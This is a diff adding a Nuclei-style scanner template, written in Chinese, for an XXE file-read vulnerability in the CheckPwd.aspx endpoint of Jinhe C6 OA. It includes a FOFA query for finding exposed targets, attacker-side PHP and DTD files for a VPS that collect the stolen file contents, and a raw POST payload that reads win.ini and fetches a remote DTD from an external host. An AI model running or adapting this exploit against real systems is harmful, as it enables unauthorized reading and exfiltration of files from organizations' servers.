@@ -1,0 +1,48 @@
+id: jinhe-c6-checkpwd-xxe-lfi
+info:
+  name: "金和 C6 CheckPwd.aspx 接口 XML 实体注入导致文件读取"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="金和网络-金和OA"
+        攻击者可通过构造恶意XML实体注入载荷，利用CheckPwd.aspx接口的XXE漏洞实现任意文件读取。具体实施需在攻击者控制的VPS部署以下组件：
+
+    get.php
+    <?php
+    $data=$_GET['file'];
+    $myfile = fopen("file.txt", "w+");
+    fwrite($myfile, $data);
+    fclose($myfile);
+    ?>
+
+    xxe.dtd
+    <!ENTITY % all "<!ENTITY send SYSTEM 'http://vpsip/get.php?file=%file;'>">
+
+    目标系统解析恶意XML时，会将指定路径的文件内容通过HTTP请求回传至攻击者服务器。该漏洞允许非授权访问敏感文件，存在严重信息泄露风险。
+  tags: 金和C6
+http:
+- raw:
+  - |
+    POST /C6/JHSoft.Web.WorkFlat/CheckPwd.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Content-Type: application/Xml
+
+    <?xml version="1.0"?>
+    <!DOCTYPE ANY[
+    <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
+    <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/xxe.dtd">
+    %remote;
+    %all;
+    ]><root>&send;</root>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
